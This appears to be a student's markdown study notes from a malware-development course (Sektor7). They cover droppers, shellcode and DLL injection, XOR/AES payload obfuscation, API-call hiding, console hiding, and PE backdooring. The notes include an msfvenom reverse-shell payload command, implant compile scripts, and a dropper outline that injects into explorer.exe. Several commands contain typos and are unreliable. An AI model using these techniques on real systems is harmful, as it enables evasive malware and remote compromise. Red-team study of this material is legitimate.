# Notes of course Malware Dev Essentials

https://www.youtube.com/@MeetSEKTOR7

All credits for => ```author: reenz0h (twitter: @sektor7net)```


# Binary Analyze

- Files Formats
  - https://github.com/angea

- PE-bear
  - https://github.com/hasherezade/pe-bear-releases
  - https://hshrzd.wordpress.com/pe-bear/

- Visual Studio Command line
  - dumpbin /headers c:\path\to\bin

- Proccess Hacker (advanced task manager)
  - https://processhacker.sourceforge.io/


# Droppers

- Droppers are special code/programs witch are use to delivery your payload to the target. Dropper can be very simple. 
  The main function on/of the dropper is to delivery your main payload to the machine and execute.

- Store payload/shellcode in .text, .data, .rsrc section on binaries...
  - Droppers
    - DataSectionpayload.cpp
    - TextSectionpayload.cpp
    - these and other implants/droppers can be compiled like this:
    ``` 
    @ECHO OFF
    cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcode.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
    ```

- AV or EDRs can see memory containing READ,WRITE,EXEC perms...????


#### Shellcode stored in a .ico file (create files and compile implant)
  - implant RsrcSectionpayload.cpp

1 - put shellcode in .ico file (Ex: payload.ico)
    ```
    msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.1.246 LPORT=4444 -f raw -o payload.ico
    ```

2 - create file resources.h

    ```#define FAVINCO_ICO 100```

3 - create file resource.rc

    ```
    #include "resources.h"

    FAVICON_ICO RCDATA payload.ico
    ```

4 - compile implant with compile.bat

     ```
     @ECHO OFF

     rc resource.rc
     cvtres /MACHINE:x64 /OUT:resources.o resources.res
     cl.exe /nologo /0x /MT /WO /GS- /DNDEBUG /Tcode.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64 resources.o
     ```

#### resources 
- https://ecto.gitbook.io/site/red-teaming-pentesting/sektor7-malware-development-essentials-project#implant-initial-version-storing-payload-in-resource-section

> ___


# Code Injection

- Classic methods: shellcode/payload injection w/ debugging Win API, and DLL injection

- Code Injection is a method of transfering your payload from one proccess to another.

- You may want to run your payload in diferent process for some reason:

  - 1 reason -> you is running a payload in process has limit time of living... In this situation you have to migrate to another process if you want preserve your session.

  - 2 reason -> changing work context... you want exec adictional payload like second stage shellcode, but you need to download from your c2 server with on internet, in opsec perspective is not best idea because current program is not usual witch talk to internet. So you do first migrate to some more legitim process like web-browser an then download from c2 server (firewall can block outgoing connections from programs witch should not talk to internet like ms-word)

  - 3 reason -> TOON rule = "Two is one, One is none". If you have one connect to a environment you have nothing, but you have two connections you have one.

> ___


# DLL Injection

- Its similar concept to shellcode injection, but instead of shellcode what your going to inject is a dll module tipically a file on the disk witch we
  want run to inside target process... but it can be also dropped by the dropper at runtime or even dropper can download the from c2 server.

- Usually what we do is allocate empty buffer in the remote process, but this time it will hold the path to DLL on disk instead of DLL it self.
  The reason is that DLL is PE file so it needs to be parse at loading time by the loader, so the target process can gets the DLL loaded in the
  initialized properly for a future use.

- We need a Dll and a injector to inject the Dll

- Implants/Droppers
  - DllInjection.cpp
  - DllInjector.cpp
  - compile how ????


#### resources

- https://youtu.be/IuA-2IGGWTE?si=0oyPTy5QFpklXDbB


> ___


# Payload Obfuscation (Encoding and Encrypting)

- Encode payload with certutil
  - C:\> certutil -encode <file or string> output.file

- Base64 enc

- Xor enc
  - xorPy.py
  - printCiphertext(xor("VirtualAllocEx", "key"))
  - output: {0x54, 0x67, 0x43 ...};
  - EncXorPayload.cpp

- AES encrypt
  - aesPy3.py
  - AesCryptPayload.cpp

- these and other implants/droppers can be compiled like this:
    ``` 
    @ECHO OFF
    cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcode.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
    ```  

#### resources
- https://0xpat.github.io/Malware_development_part_1/
- https://captmeelo.com/redteam/maldev/2021/12/15/lazy-maldev.html
- https://captmeelo.com/redteam/maldev/2022/10/17/independent-malware.html


> ___


# Function call Obfuscation

- See import address table
  - dumpbin /imports <file.exe>

- Implants/Droppers
  - funcObfuscation.cpp
  - FinalDropperObfFunc.cpp
  - these and other implants/droppers can be compiled like this:
    ``` 
    @ECHO OFF
    cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
    ```


#### resources
- https://josh-vr.gitbook.io/site/red-teaming-pentesting/sektor7-malware-development-essentials-project#implant-upgrade-3-hiding-function-calls
- https://0xpat.github.io/Malware_development_part_4/
- https://vanmieghem.io/process-injection-evading-edr-in-2023/
- https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware


# Hidding Console

- Implants
  - hiddingConsole.cpp
  - guiTrick.cpp

- Using function FreeConsole...

- Compile a GUI program:
  - WinMain is a function witch the compiler looking for wan it parses the source code of the program it compile... For GUI programs we need "WinMain" and for consle programs "main function"

- Compile Console Program (in a .bat file)

  ```
   @ECHO OFF
   cl.exe /nologo /0x /MT /W0 /GS- /DNDEBUG /Tcode.cpp /link /OUT:code.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
  ```

- Compile GUI Program (in a .bat file)

  ```
  @ECHO OFF
  cl.exe /nologo /0x /MT /W0 /GS- /DNDEBUG /Tcode.cpp /link /OUT:code.exe /SUBSYSTEM:WINDOWS /MACHINE:x64
  ```  

> ___


# Backdoors and Trojans

This section covered code caves, hiding data within a PE, and how to backdoor an existing executable with a payload. x64dbg debugger is used extensively to examine a binary, find space for a payload, and ensure that the existing binary still functions normally. 

Briefly described techniques ( Code Cave, New Section and Extending Section) and then video with practical approach of full understanding Code Cave is working. Using WinDBG(or some debugger), choosing addresses with assembler commands copy them to our notepad/notepad++ to restore them later, saving values of registers, doing big jump to big part of space at the end which is our code cave in .text section, restoring values of register and going forward with process of the original code.


#### READ/SEE

- https://ap3x.github.io/posts/backdooring-portable-executables-(pe)/


# Final Dropper

- shellcode 
- extract shellcode from .rsrc (favicon.ico)
- decrypt shellcode (XOR)
- inejct shellcode into explorer.exe
- get rid of console window (pop up)


#### Links associated

- https://josh-vr.gitbook.io/site/red-teaming-pentesting/sektor7-malware-development-essentials-project
